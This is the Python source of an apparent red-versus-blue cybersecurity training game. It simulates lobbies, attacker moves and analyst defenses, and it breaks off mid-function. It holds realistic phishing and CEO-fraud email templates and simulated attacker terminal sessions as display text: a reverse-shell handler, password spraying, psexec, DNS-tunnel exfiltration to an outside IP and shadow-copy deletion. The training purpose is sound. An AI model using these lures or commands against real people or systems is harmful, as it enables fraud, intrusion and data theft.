"""
duel.py — Red vs Blue Duel: in-memory lobby + game engine for Flask-SocketIO.

Lobbies and games are stored in plain Python dicts so no database is needed.
The module is designed to be easy to extend to 2v2 or team modes later.
"""

import uuid
import random
from datetime import datetime, timezone
from typing import Callable

# ── In-memory state ───────────────────────────────────────────────────────────
# Keyed by lobby_id (str)
lobbies: dict = {}
# Keyed by lobby_id (str); created when a lobby transitions to "in_game"
games: dict = {}


# ── Attacker action definitions ───────────────────────────────────────────────
ATTACKER_ACTIONS = {
    "phishing": {
        "label": "Phishing Attack",
        "icon": "🎣",
        "base_progress": 15,
        "detection_risk": 0.30,
        "description": "Send deceptive emails to harvest credentials.",
        "countered_by": ["mfa_enforcement", "user_awareness_training"],
    },
    "password_spray": {
        "label": "Password Spray",
        "icon": "🔑",
        "base_progress": 10,
        "detection_risk": 0.40,
        "description": "Try common passwords across many accounts.",
        "countered_by": ["mfa_enforcement"],
    },
    "exploit_vuln": {
        "label": "Exploit Vulnerability",
        "icon": "💣",
        "base_progress": 22,
        "detection_risk": 0.20,
        "description": "Leverage an unpatched software vulnerability.",
        "countered_by": ["firewall_hardening"],
    },
    "lateral_movement": {
        "label": "Lateral Movement",
        "icon": "↔️",
        "base_progress": 18,
        "detection_risk": 0.35,
        "description": "Move through the network to reach sensitive systems.",
        "countered_by": ["network_segmentation"],
    },
    "data_exfil": {
        "label": "Data Exfiltration",
        "icon": "📤",
        "base_progress": 30,
        "detection_risk": 0.50,
        "description": "Attempt to extract sensitive data from the network.",
        "countered_by": ["firewall_hardening", "edr"],
        "requires_progress": 60,  # only unlocked when attacker_progress >= 60
    },
}

# ── Analyst defense definitions ───────────────────────────────────────────────
ANALYST_DEFENSES = {
    "firewall_hardening": {
        "label": "Firewall Hardening",
        "icon": "🔥",
        "description": "Restricts inbound/outbound traffic — counters exploits and exfil.",
    },
    "edr": {
        "label": "Endpoint Detection (EDR)",
        "icon": "🖥️",
        "description": "Detects malicious behaviour on endpoints — raises detection across all attacks.",
    },
    "network_segmentation": {
        "label": "Network Segmentation",
        "icon": "🌐",
        "description": "Isolates network zones — counters lateral movement.",
    },
    "mfa_enforcement": {
        "label": "MFA Enforcement",
        "icon": "📱",
        "description": "Requires multi-factor auth — counters phishing and password sprays.",
    },
    "user_awareness_training": {
        "label": "User Awareness Training",
        "icon": "📚",
        "description": "Educates users to recognise attacks — counters phishing.",
    },
}

# ── Analyst in-game action definitions ────────────────────────────────────────
ANALYST_ACTIONS = {
    "investigate_alert": {
        "label": "Investigate Alert",
        "icon": "🔍",
        "detection_gain": 15,
        "progress_reduction": 0,
        "description": "Analyse an alert to gather intelligence.",
        "is_containment": False,
    },
    "block_ip": {
        "label": "Block IP",
        "icon": "🚫",
        "detection_gain": 20,
        "progress_reduction": 8,
        "description": "Block the attacker's IP address.",
        "is_containment": True,
    },
    "isolate_host": {
        "label": "Isolate Host",
        "icon": "🔒",
        "detection_gain": 25,
        "progress_reduction": 15,
        "description": "Quarantine a compromised host to stop the spread.",
        "is_containment": True,
    },
    "reset_credentials": {
        "label": "Reset Credentials",
        "icon": "🔄",
        "detection_gain": 10,
        "progress_reduction": 10,
        "description": "Force-reset credentials to revoke stolen access.",
        "is_containment": False,
    },
    "ignore": {
        "label": "Ignore",
        "icon": "👁️",
        "detection_gain": 0,
        "progress_reduction": 0,
        "description": "Do nothing and hope it goes away.",
        "is_containment": False,
    },
}

# ── Attacker intel source definitions ─────────────────────────────────────────
INTEL_SOURCES = {
    "linkedin_scrape": {
        "label": "LinkedIn Profile Scraping",
        "icon": "💼",
        "description": "Enumerate employee profiles to map org structure, roles, and key personnel.",
    },
    "domain_enum": {
        "label": "Domain & DNS Enumeration",
        "icon": "🌐",
        "description": "WHOIS lookups, DNS zone transfer attempts, and subdomain brute-force.",
    },
    "darkweb_creds": {
        "label": "Dark Web Credential Search",
        "icon": "🕷️",
        "description": "Search breach databases and paste sites for leaked credentials.",
    },
    "google_dorking": {
        "label": "Google Dorking / OSINT",
        "icon": "🔎",
        "description": "Advanced search operators to find exposed documents and sensitive data.",
    },
    "social_media": {
        "label": "Social Media OSINT",
        "icon": "📱",
        "description": "Mine social platforms for executive travel patterns and personal info.",
    },
}

# ── Fake intel data pools ──────────────────────────────────────────────────────
_ORGS = [
    {"name": "Meridian Financial Group",  "domain": "meridianfg.com",    "industry": "Finance"},
    {"name": "TechNova Solutions",         "domain": "technova-corp.io",   "industry": "Technology"},
    {"name": "Cascade Health Systems",     "domain": "cascadehealth.net",  "industry": "Healthcare"},
    {"name": "Apex Logistics Corp",        "domain": "apexlogistics.co",   "industry": "Logistics"},
    {"name": "BlueSky Insurance Ltd",      "domain": "blueskyins.com",     "industry": "Insurance"},
]
_EXEC_POOL = {
    "ceo":      ["James Whitfield", "Sarah Harrington", "Robert Nakamura", "Elena Vasquez",  "David Okonkwo"],
    "cfo":      ["Linda Chen",      "Marcus Webb",      "Patricia Ogundimu","Thomas Reeves",  "Nadia Kowalski"],
    "it_admin": ["Kevin Park",      "Michelle Torres",  "Brian Gallagher",  "Samantha Diaz",  "Alex Johansson"],
    "hr_mgr":   ["Rachel Simmons",  "Omar Nasser",      "Jess Whitmore",    "Carlos Fuentes", "Anya Petrov"],
}
_EMAIL_FMT_POOL = [
    ("firstname.lastname", lambda f, l: f"{f}.{l}"),
    ("f.lastname",         lambda f, l: f"{f[0]}.{l}"),
    ("firstnamelastname",  lambda f, l: f"{f}{l}"),
    ("firstname_lastname", lambda f, l: f"{f}_{l}"),
]
_LEAKED_PASSWORDS = [
    "Summer2023!", "Welcome1!", "Company@123", "Passw0rd!", "Jan2024#",
    "Qwerty123!", "Football1", "iloveyou2!", "abc123ABC", "Dragon99!",
]
_BREACH_SOURCES = [
    "RockYou2024 credential compilation",
    "LinkedIn 2021 breach (533M records)",
    "Collection #1 dump (773M credentials)",
    "2023 Infostealer log aggregation",
]
_TECH_STACK_POOL = [
    "Microsoft 365 tenant confirmed (MX → outlook.office365.com)",
    "Cisco ASA firewall detected via HTTPS banner on port 443",
    "Exposed Jira at jira.{domain} — unauthenticated issue listing enabled",
    "Apache 2.4.49 on dmz.{domain} — potentially CVE-2021-41773 affected",
    "Citrix Gateway at remote.{domain} — version banner leaks build",
    "Zoom SSO with Azure AD tenant (tenant ID exposed in metadata)",
    "Unprotected Jenkins CI at build.{domain} — job output readable",
]
_EXPOSED_DOC_POOL = [
    "org-chart-Q3-2023.pdf via filetype:pdf site:{domain}",
    "IT asset inventory spreadsheet cached on Google from public SharePoint",
    "network-topology-v2.pdf in archived IT blog post",
    "employee-handbook.pdf at docs.{domain}/public/hr/",
    "VPN setup guide on pastebin referencing {domain} credentials",
]
_SOCIAL_EVENT_POOL = [
    "{ceo} on LinkedIn: 'Excited to keynote at FinTech Summit in Vegas this week! 🎲'",
    "{ceo} posted: 'Proud to announce record Q3 results — our best quarter yet!'",
    "{ceo} Twitter: 'Flying to London for the board meeting Monday. Bring on the jetlag!'",
    "{ceo} tagged at {industry} Innovation Conference in San Francisco.",
    "{ceo} LinkedIn: 'Thrilled to welcome our new CISO — big investments in security ahead!'",
]
_INTERESTS_POOL = [
    "{ceo} frequently posts about marathon training and Garmin GPS watches.",
    "{ceo} active on golf forums; photos from Pebble Beach last summer.",
    "{ceo} wine enthusiast; follows Napa Valley vineyards and posts tasting notes.",
    "{ceo} landscape photographer; active on Instagram with 2.3K followers.",
]


def _fmt_email(first: str, last: str, fmt_fn) -> str:
    return fmt_fn(first.lower(), last.lower())


def generate_intel(sources: list) -> dict:
    """Generate a randomised intel dossier based on the chosen intel sources."""
    org_idx = random.randint(0, len(_ORGS) - 1)
    org      = _ORGS[org_idx]
    ceo      = _EXEC_POOL["ceo"][org_idx]
    cfo      = _EXEC_POOL["cfo"][org_idx]
    it_admin = _EXEC_POOL["it_admin"][org_idx]
    hr_mgr   = _EXEC_POOL["hr_mgr"][org_idx]
    fmt_label, fmt_fn = random.choice(_EMAIL_FMT_POOL)
    domain   = org["domain"]

    def _email(full_name: str) -> str:
        parts = full_name.split()
        return f"{_fmt_email(parts[0], parts[-1], fmt_fn)}@{domain}"

    intel: dict = {
        "org_name":    org["name"],
        "domain":      domain,
        "industry":    org["industry"],
        "ceo_name":    ceo,
        "cfo_name":    cfo,
        "it_admin":    it_admin,
        "hr_mgr":      hr_mgr,
        "_ceo_email":  _email(ceo),
        "_cfo_email":  _email(cfo),
        "_it_email":   _email(it_admin),
        "_hr_email":   _email(hr_mgr),
    }

    if "linkedin_scrape" in sources:
        employees = [
            f"{ceo} — CEO / President",
            f"{cfo} — Chief Financial Officer",
            f"{it_admin} — IT Systems Administrator",
            f"{hr_mgr} — Human Resources Manager",
            f"{random.choice(['Tyler Brooks','Priya Mehta','Jordan Lee','Sam Osei'])} — Network Engineer",
            f"{random.choice(['Casey Nguyen','Dana Patel','Morgan Kim','Riley Johnson'])} — Finance Analyst",
        ]
        intel["personnel"] = employees[:random.randint(4, 6)]

    if "domain_enum" in sources:
        intel["email_format"] = f"{fmt_label}@{domain}"
        intel["ceo_email"]    = _email(ceo)
        intel["cfo_email"]    = _email(cfo)
        intel["it_email"]     = _email(it_admin)
        intel["subdomains"]   = [
            f"mail.{domain}", f"vpn.{domain}", f"remote.{domain}",
            f"owa.{domain}",  f"jira.{domain}",
        ]

    if "darkweb_creds" in sources:
        breach = random.choice(_BREACH_SOURCES)
        intel["leaked_creds"] = [
            f"{_email(ceo).split('@')[0]}:{random.choice(_LEAKED_PASSWORDS)}  ← {breach}",
            f"{_email(cfo).split('@')[0]}:{random.choice(_LEAKED_PASSWORDS)}  ← {breach}",
        ]

    if "google_dorking" in sources:
        intel["exposed_docs"] = [d.format(domain=domain) for d in random.sample(_EXPOSED_DOC_POOL, 2)]
        intel["tech_stack"]   = [t.format(domain=domain) for t in random.sample(_TECH_STACK_POOL, 3)]

    if "social_media" in sources:
        intel["social_event"]  = random.choice(_SOCIAL_EVENT_POOL).format(ceo=ceo, industry=org["industry"])
        intel["ceo_interests"] = random.choice(_INTERESTS_POOL).format(ceo=ceo)

    return intel


# ── Phishing email templates ───────────────────────────────────────────────────
PHISHING_EMAILS = [
    {
        "id":            "generic_password_reset",
        "subject":       "⚠️ ACTION REQUIRED: Your password expires in 24 hours",
        "from_display":  "IT Help Desk <helpdesk@{domain}>",
        "preview":       "Dear Employee,\n\nYour corporate account password will expire in 24 hours. "
                         "To avoid being locked out, please reset your credentials immediately.\n\n"
                         "[Reset Password Now]\n\nIT Support Team",
        "relevance":     "Generic — no personalisation. May be caught by spam filters.",
        "requires_intel": [],
        "progress_mult":  0.80,
        "detection_adj":  +0.05,
        "rating":         "Low",
    },
    {
        "id":            "linkedin_job_opportunity",
        "subject":       "You have a message from a LinkedIn recruiter",
        "from_display":  "LinkedIn Recruiter <recruiter@linkedin-notifications.net>",
        "preview":       "Hi {first_name},\n\nA senior executive saw your profile and wants to discuss "
                         "a confidential opportunity. Click to view the role description and compensation.\n\n"
                         "[View Exclusive Opportunity]",
        "relevance":     "Uses target employee name from LinkedIn OSINT. Bypasses some filters.",
        "requires_intel": ["linkedin_scrape"],
        "progress_mult":  1.10,
        "detection_adj":  0.00,
        "rating":         "Medium",
    },
    {
        "id":            "finance_invoice_approval",
        "subject":       "Invoice #{inv_num} — Approval Required Before EOD",
        "from_display":  "Accounts Payable <ap@{domain}>",
        "preview":       "Dear {cfo_name},\n\nPlease review and approve the attached vendor invoice before "
                         "close of business. The vendor has flagged this as urgent; delays may incur a late fee.\n\n"
                         "[Review Invoice — Approve Now]\n\nAccounts Payable",
        "relevance":     "Finance-themed using CFO name and real domain. High credibility.",
        "requires_intel": ["domain_enum"],
        "progress_mult":  1.25,
        "detection_adj":  -0.05,
        "rating":         "High",
    },
    {
        "id":            "ceo_wire_transfer",
        "subject":       "Confidential — urgent request",
        "from_display":  "{ceo_name} <{ceo_email_spoof}>",
        "preview":       "Hi,\n\nI'm in a board meeting and can't talk. I need you to process an urgent wire "
                         "transfer to a new vendor today. Keep this confidential — I'll brief you when I'm back.\n\n"
                         "Thanks,\n{ceo_name}",
        "relevance":     "CEO fraud / BEC using real CEO name and spoofed domain. Very effective.",
        "requires_intel": ["linkedin_scrape", "domain_enum"],
        "progress_mult":  1.60,
        "detection_adj":  -0.10,
        "rating":         "Very High",
    },
    {
        "id":            "it_helpdesk_ticket",
        "subject":       "Re: Your IT Ticket #{ticket_num} — Action Required",
        "from_display":  "{it_admin} <{it_email_spoof}>",
        "preview":       "Hi,\n\nFollowing up on your recent support request. To complete the maintenance "
                         "window our team needs your Active Directory credentials to migrate your profile. "
                         "This is routine — please reply with your username and password.\n\n"
                         "Thanks,\n{it_admin}\nIT Systems",
        "relevance":     "Uses real IT admin name — very convincing if LinkedIn+domain intel gathered.",
        "requires_intel": ["linkedin_scrape", "domain_enum"],
        "progress_mult":  1.40,
        "detection_adj":  -0.05,
        "rating":         "High",
    },
]


def _compute_phishing_email_options(game: dict) -> list:
    """Return phishing email options with ratings based on gathered intel."""
    intel   = game.get("attacker_intel_data", {})
    sources = game.get("attacker_intel_sources", [])
    domain  = intel.get("domain", "target-corp.com")
    ceo     = intel.get("ceo_name", "the CEO")
    cfo     = intel.get("cfo_name", "the CFO")
    it_admin = intel.get("it_admin", "IT Admin")
    ceo_email = intel.get("_ceo_email", f"ceo@{domain}")
    it_email  = intel.get("_it_email",  f"it@{domain}")
    inv_num    = random.randint(10000, 99999)
    ticket_num = random.randint(1000,  9999)
    first_name = random.choice(_RANDOM_USERS).capitalize()

    options = []
    for tmpl in PHISHING_EMAILS:
        has_intel = all(r in sources for r in tmpl["requires_intel"])
        options.append({
            "id":           tmpl["id"],
            "subject":      tmpl["subject"].format(
                domain=domain, inv_num=inv_num, ticket_num=ticket_num,
                ceo_name=ceo, cfo_name=cfo, it_admin=it_admin,
            ),
            "from_display": tmpl["from_display"].format(
                domain=domain, ceo_name=ceo, it_admin=it_admin,
                ceo_email_spoof=ceo_email.replace(domain, domain.replace(".", "-mail.") + ".net"),
                it_email_spoof=it_email.replace(domain, domain.replace(".", "-it.") + ".net"),
            ),
            "preview":      tmpl["preview"].format(
                domain=domain, first_name=first_name,
                ceo_name=ceo, cfo_name=cfo, it_admin=it_admin,
                inv_num=inv_num, ticket_num=ticket_num,
            ),
            "relevance":    tmpl["relevance"],
            "has_intel":    has_intel,
            "rating":       tmpl["rating"] if has_intel else "Low",
            "rating_note":  "" if has_intel else "⚠️ Missing intel — effectiveness reduced",
        })
    return options


# ── Log templates ─────────────────────────────────────────────────────────────
_LOG_TEMPLATES = {
    "phishing": [
        "[MAIL-GW] Outbound phishing campaign sent — {n} recipients from spoofed domain",
        "[AUTH] Credential harvested — user {user} portal login from {ip}",
        "[SIEM] Phishing indicators detected in O365 mail gateway logs",
    ],
    "password_spray": [
        "[AUTH] Multiple failed logins across {n} accounts in 60 seconds",
        "[IDS] High-volume authentication failures from {ip}",
        "[SIEM] Password spray pattern detected on domain controller",
    ],
    "exploit_vuln": [
        "[IDS] Exploit payload detected targeting service on port {port}",
        "[SIEM] CVE-{cve} exploitation attempt logged",
        "[FW] Anomalous outbound beacon to {ip}",
    ],
    "lateral_movement": [
        "[SIEM] Unusual SMB activity from {host} to {host2}",
        "[IDS] Pass-the-hash attempt detected",
        "[AUTH] Service account {user} accessed new system {host}",
    ],
    "data_exfil": [
        "[DLP] Large data transfer to external IP {ip} — {mb} MB",
        "[FW] Egress spike: {mb} MB to unknown destination",
        "[SIEM] Data exfiltration pattern detected — immediate action required",
    ],
    "investigate_alert": [
        "[SOC] Alert {id} investigated — threat confirmed",
        "[SIEM] Analyst escalated alert — attacker TTPs identified",
    ],
    "block_ip": [
        "[FW] IP {ip} added to deny list",
        "[SOC] Blocking rule applied for malicious host {ip}",
    ],
    "isolate_host": [
        "[EDR] Host {host} quarantined — network access revoked",
        "[SOC] Endpoint isolation completed for {host}",
    ],
    "reset_credentials": [
        "[AUTH] Credentials reset for account {user} — tokens invalidated",
        "[AD] Forced password change applied to {n} affected accounts",
    ],
    "ignore": [
        "[SOC] Alert {id} marked as low priority — no action taken",
    ],
}

_RANDOM_IPS    = ["10.0.2.15", "192.168.1.44", "172.16.5.200", "203.0.113.42", "185.234.219.7"]
_RANDOM_HOSTS  = ["WS-FINANCE-01", "DC-PROD-02", "SRV-HR-03", "LAPTOP-CEO", "FILE-SRV-01"]
_RANDOM_USERS  = ["jsmith", "alee", "tmartin", "dbrown", "swhite"]
_RANDOM_PORTS  = [443, 8080, 3389, 445, 22]
_RANDOM_CVES   = ["2023-44487", "2024-21413", "2023-23397", "2022-30190"]

# ── SIEM noise log templates ───────────────────────────────────────────────────
_NOISE_TEMPLATES = [
    "[AUTH] {ts}  Successful login: {user}@CORP.LOCAL from {int_ip} (host: {host})",
    "[FW]   {ts}  ALLOW TCP {int_ip}:49{rand3} → 8.8.8.8:53 (DNS)",
    "[PROXY]{ts}  GET https://mail.google.com — 200 OK — user {user}",
    "[AV]   {ts}  Scheduled scan on {host} completed — 0 threats",
    "[SYSLOG]{ts} {host}: ntpd — clock synced to 10.0.0.1 (stratum 3)",
    "[FW]   {ts}  ALLOW ICMP {int_ip} → 10.0.0.1 (ping health check)",
    "[IDS]  {ts}  Routine signature update — 1,{rand3} rules active",
    "[BACKUP]{ts} Daily incremental backup FILE-SRV-01 — {rand2}GB OK",
    "[VPN]  {ts}  {user} connected from {ext_ip} (SSL VPN, session 0{rand1}h {rand2}m)",
    "[WIN]  {ts}  {host}: Task Scheduler — 'WindowsDefenderCache' triggered",
    "[PROXY]{ts}  GET https://windowsupdate.microsoft.com — 200 OK",
    "[AUTH] {ts}  GPO applied to {host} — user {user} — 0 errors",
    "[SIEM] {ts}  Correlation check — no new critical events (last 5 min)",
    "[FW]   {ts}  DENY UDP {ext_ip}:1900 → any (SSDP probe — blocked)",
    "[PROXY]{ts}  GET https://sharepoint.com — 200 OK — user {user}",
    "[SYSLOG]{ts} {host}: sshd — session closed for {user} port 22",
    "[WIN]  {ts}  {host}: Service 'wuauserv' started (Windows Update)",
    "[IDS]  {ts}  HTTP scan: 14,{rand3} packets inspected — 0 anomalies",
    "[AUTH] {ts}  Kerberos TGT issued for {user}@CORP.LOCAL",
    "[FW]   {ts}  ALLOW TCP {int_ip}:443 → 13.107.42.14:443 (O365)",
]
_INT_IPS = ["10.0.1.15", "10.0.1.22", "10.0.1.87", "172.16.5.12", "192.168.10.44"]
_EXT_IPS = ["104.21.14.5", "172.64.153.1", "13.107.42.14", "52.96.112.83", "185.201.139.3"]


def _make_noise_logs(n: int = 3) -> list:
    """Return n realistic background SIEM noise entries."""
    chosen = random.sample(_NOISE_TEMPLATES, min(n, len(_NOISE_TEMPLATES)))
    result = []
    for tmpl in chosen:
        ts = datetime.now(timezone.utc).strftime("%H:%M:%S")
        result.append(tmpl.format(
            ts=ts,
            user=random.choice(_RANDOM_USERS),
            host=random.choice(_RANDOM_HOSTS),
            int_ip=random.choice(_INT_IPS),
            ext_ip=random.choice(_EXT_IPS),
            rand1=random.randint(0, 9),
            rand2=random.randint(10, 99),
            rand3=random.randint(100, 999),
        ))
    return result


# ── CLI simulation outputs (attacker) ─────────────────────────────────────────
def _make_cli_output(action_id: str, game: dict, extra: dict = None) -> str:
    """Return a realistic attacker terminal session for the given action."""
    extra    = extra or {}
    intel    = game.get("attacker_intel_data", {})
    ip       = random.choice(_RANDOM_IPS)
    host     = random.choice(_RANDOM_HOSTS)
    host2    = random.choice([h for h in _RANDOM_HOSTS if h != host])
    user     = random.choice(_RANDOM_USERS)
    u2, u3, u4, u5 = [random.choice(_RANDOM_USERS) for _ in range(4)]
    port     = random.choice(_RANDOM_PORTS)
    cve      = random.choice(_RANDOM_CVES)
    mb       = random.randint(50, 500)
    n        = random.randint(15, 60)
    ts       = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")
    domain   = intel.get("domain", "target-corp.com")
    ceo      = intel.get("ceo_name", "J. Smith")
    cfo      = intel.get("cfo_name", "L. Chen")
    it_admin = intel.get("it_admin", "K. Park")
    ceo_email = intel.get("_ceo_email", f"ceo@{domain}")
    opens  = random.randint(1, max(1, n // 3))
    clicks = random.randint(0, opens)
    creds  = random.randint(0, max(0, clicks - 1) + 1)

    if action_id == "phishing":
        phishing_id = extra.get("phishing_email_id", "generic_password_reset")
        templates = {
            "generic_password_reset": f"""\
root@kali:~# python3 gophish_campaign.py --config campaign.yml
[*] GoPhish Campaign Manager v0.12.1
[*] SMTP relay : mail-relay.{domain} (open relay detected)
[*] Template   : "IT Help Desk — Password Expiry Notice"
[*] Target list: {n} recipients from harvested email list
[*] Sending...
    ████████████████████████████ 100%  [{n}/{n}]

[+] Campaign complete
    Sent    : {n}
    Opened  : {opens}  ({round(opens/n*100)}% open rate)
    Clicked : {clicks}  ({round(clicks/n*100) if n else 0}% click-through)
    Creds   : {creds}  credential entries captured
[*] Loot saved → loot/harvest_{ts[:10]}.json""",
            "finance_invoice_approval": f"""\
root@kali:~# python3 gophish_campaign.py --config invoice_bec.yml
[*] GoPhish Campaign Manager v0.12.1
[*] SMTP relay  : mail-relay.{domain}
[*] Spoofed from: ap@{domain}  (header injection)
[*] Target      : {cfo} <{intel.get('_cfo_email', 'cfo@' + domain)}>
[*] Subject     : "Invoice #{random.randint(10000,99999)} — Approval Required Before EOD"
[*] Sending...
    ████████████████████████████ 100%  [{n}/{n}]

[+] Campaign complete
    Sent    : {n}
    Opened  : {opens}  ({round(opens/n*100)}% open rate)
    Clicked : {clicks}
    Creds   : {creds}
[!] Finance-themed hook — higher click-through expected""",
            "ceo_wire_transfer": f"""\
root@kali:~# python3 bec_spoof.py --target finance@{domain} \\
    --from "{ceo} <{ceo_email.replace(domain, domain.replace('.', '-mail.') + '.net')}>"
[*] Business Email Compromise (BEC) module
[*] Spoofed sender : {ceo} (lookalike domain)
[*] Target dept    : Finance / Accounts Payable
[*] Subject        : "Confidential — urgent request"
[*] Sending (stealth — no tracking pixel)...

[+] Email delivered to {n} recipients
[!] {opens} opened  (estimated — no pixel)
[!] {clicks} replies received
[+] Wire transfer request acknowledged by {cfo}""",
            "linkedin_job_opportunity": f"""\
root@kali:~# python3 gophish_campaign.py --config linkedin_lure.yml
[*] GoPhish Campaign Manager v0.12.1
[*] From    : LinkedIn Recruiter <recruiter@linkedin-notifications.net>
[*] Template: "Exclusive job opportunity — action required"
[*] Targets : {n} employees (sourced from LinkedIn scrape)
[*] Sending...
    ████████████████████████████ 100%

[+] Campaign complete — LinkedIn lure
    Sent    : {n}
    Opened  : {opens}
    Clicked : {clicks}
    Creds   : {creds}""",
            "it_helpdesk_ticket": f"""\
root@kali:~# python3 bec_spoof.py --target all-staff@{domain} \\
    --from "{it_admin} <{intel.get('_it_email','it@'+domain).replace(domain,domain.replace('.', '-it.') + '.net')}>"
[*] Spear-phish module — IT HelpDesk impersonation
[*] Spoofed sender : {it_admin} (IT Systems)
[*] Subject        : "Re: Your IT Ticket — Action Required"
[*] Payload        : credential harvester (404-redirect style)

[+] Sent to {n} targets
[+] {opens} opened  |  {clicks} clicked  |  {creds} creds captured
[!] High credibility — uses real IT admin identity""",
        }
        return templates.get(phishing_id, templates["generic_password_reset"])

    if action_id == "password_spray":
        hit_user = random.choice(_RANDOM_USERS)
        pw = random.choice(["Password1!", "Summer2023!", "Welcome123", "Company@1"])
        return f"""\
root@kali:~# crackmapexec smb 10.0.1.0/24 -u users.txt -p passwords.txt --continue-on-success
SMB  {ip}  445  {host}  [*] Windows Server 2019 (domain:CORP)
SMB  {ip}  445  {host}  [-] CORP\\{u2}:Welcome1!         STATUS_LOGON_FAILURE
SMB  {ip}  445  {host}  [-] CORP\\{u3}:Summer2023!       STATUS_LOGON_FAILURE
SMB  {ip}  445  {host}  [-] CORP\\{user}:Password1!      STATUS_LOGON_FAILURE
SMB  {ip}  445  {host}  [+] CORP\\{hit_user}:{pw}        (Pwn3d!)
SMB  {ip}  445  {host}  [-] CORP\\{u4}:Company@123      STATUS_LOGON_FAILURE
SMB  {ip}  445  {host}  [-] CORP\\{u5}:Jan2024#          STATUS_LOGON_FAILURE

[+] Valid credential: CORP\\{hit_user}:{pw}
[*] Writing to loot/valid_creds_{ts[:10]}.txt"""

    if action_id == "exploit_vuln":
        return f"""\
root@kali:~# msfconsole -q
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set LHOST 10.99.0.1
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Started reverse TCP handler on 10.99.0.1:4444

root@kali:~# python3 exploit_CVE-{cve}.py --target {ip}:{port}
[*] Scanning {ip}:{port} — checking patch level...
[*] Target appears VULNERABLE — sending payload...
[+] Shell received!

[*] Meterpreter session 1 opened (10.99.0.1:4444 → {ip}:{port})
meterpreter > getuid
Server username: NT AUTHORITY\\SYSTEM
meterpreter > sysinfo
Computer  : {host}
OS        : Windows Server 2019 (Build 17763)
Domain    : CORP
meterpreter > run post/multi/recon/local_exploit_suggester"""

    if action_id == "lateral_movement":
        return f"""\
root@kali:~# python3 SharpHound.py --CollectionMethods All --Domain CORP.LOCAL
[*] SharpHound 1.1.1 — BloodHound collection
[*] Collecting ACLs, sessions, local admins, trusts...
[+] Domains : CORP.LOCAL
[+] DCs     : {host} ({ip})
[+] {random.randint(50,300)} computers  |  {random.randint(100,800)} users
[*] Collection complete in 00:01:{random.randint(10,59):02d}

[*] Analysing attack paths...
[+] Path found: CORP\\{user} → AdminTo → {host2}
[+] Kerberoastable SPN: MSSQLSvc/{host2}:1433

root@kali:~# psexec.py CORP/{user}:Password1!@{host2} cmd.exe
Impacket v0.12.0  Copyright 2024 Fortra
[*] Requesting shares on {host2}
[*] Found writable share ADMIN$
[*] Uploading BOFAOBJ.exe
[+] Connected to {host2} as NT AUTHORITY\\SYSTEM
C:\\Windows\\system32> whoami
nt authority\\system"""

    if action_id == "data_exfil":
        return f"""\
root@kali:~# python3 stage_exfil.py --host {host} --shares Finance HR Legal
[*] Enumerating shares on {host}...
[+] \\\\{host}\\Finance$  — accessible
[+] \\\\{host}\\HR$       — accessible
[+] \\\\{host}\\Legal$    — accessible
[*] Copying files... [{mb * 1024} files staged]
[*] Compressing → archive.7z ({mb} MB)  ████████ 100%

root@kali:~# python3 dnscat2.py --dns server=185.192.71.99,port=53
[*] Establishing C2 channel via DNS tunnelling...
[+] Tunnel active  185.192.71.99:53

root@kali:~# python3 upload_loot.py --via dns --file archive.7z
Upload: ████████████████████ 100%  ({mb} MB sent)
[+] Exfiltration complete — {mb} MB transmitted
[*] Clearing artefacts... VSS shadow copies deleted"""

    return f"[*] Executing {action_id}...\n[+] Done."


# ── SIEM / SOC tool outputs (analyst) ─────────────────────────────────────────
def _make_siem_tool_output(action_id: str, game: dict) -> str:
    """Return a realistic SOC analyst tool session for the given action."""
    ip         = random.choice(_RANDOM_IPS)
    host       = random.choice(_RANDOM_HOSTS)
    u1         = random.choice(_RANDOM_USERS)
    u2         = random.choice(_RANDOM_USERS)
    n          = random.randint(2, 8)
    ts         = datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S")
    alert_id   = str(uuid.uuid4())[:8].upper()
    case_id    = f"CASE-{random.randint(1000, 9999)}"
    ticket_num = random.randint(10000, 99999)
    change_id  = f"CHG{random.randint(100000, 999999)}"
    days1, days2 = random.randint(1, 30), random.randint(1, 30)

    if action_id == "investigate_alert":
        return f"""\
analyst@soc-ws:~$ splunk search 'index=main sourcetype=siem earliest=-1h | sort -_time' -maxout 20
Connecting to Splunk Enterprise (https://splunk.corp:8089)...
Retrieving results...

TIME          SOURCE     SEV   EVENT
──────────────────────────────────────────────────────────────────────
{ts}  SIEM       HIGH  Alert #{alert_id}: Suspicious lateral movement — {host}
{ts}  EDR        CRIT  Process injection: svchost.exe → explorer.exe on {host}
{ts}  IDS        HIGH  Snort 1:2030853 triggered — ET MALWARE CobaltStrike beacon
{ts}  AUTH       MED   Kerberoasting: {random.randint(3,12)} SPNs requested by {u1}@CORP
{ts}  FW         MED   Anomalous egress: {ip} → 185.192.71.99:443 ({random.randint(1,9)}MB)
──────────────────────────────────────────────────────────────────────
[+] TTP mapping (MITRE ATT&CK):
    T1003 — OS Credential Dumping
    T1059 — Command and Scripting Interpreter
    T1071 — Application Layer Protocol (C2)

[+] Threat confirmed. Escalating to Tier 2.
[*] Case {case_id} created in SOAR. Analyst assigned: YOU"""

    if action_id == "block_ip":
        return f"""\
analyst@soc-ws:~$ sudo iptables -I INPUT -s {ip} -j DROP
analyst@soc-ws:~$ sudo iptables -I FORWARD -s {ip} -j DROP
analyst@soc-ws:~$ sudo iptables -I OUTPUT -d {ip} -j DROP

analyst@soc-ws:~$ iptables -L INPUT -n --line-numbers | grep {ip}
1   DROP  all  --  {ip}   0.0.0.0/0   /* SOC-block {ts[:10]} */

[+] Host firewall rule applied.

analyst@soc-ws:~$ python3 pa_fw_update.py \\
    --firewall PA-VM-PROD-FW-01 \\
    --action deny --src-ip {ip} --all-ports \\
    --comment "IOC: Active threat — case {case_id}"
[*] Connecting to Palo Alto PAN-OS API...
[*] Adding security policy rule...
[+] Rule 'SOC-DENY-{ip.replace(".","-")}' added (position 2)
[+] Commit pushed — Change ID: {change_id}
[+] Rule propagated to all HA peers."""

    if action_id == "isolate_host":
        return f"""\
analyst@soc-ws:~$ crowdstrike-cli contain --hostname {host} --reason "Active threat — {case_id}"

CrowdStrike Falcon Real-Time Response
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Host     : {host}
AID      : {uuid.uuid4().hex[:16].upper()}
Status   : ACTIVE → CONTAINED
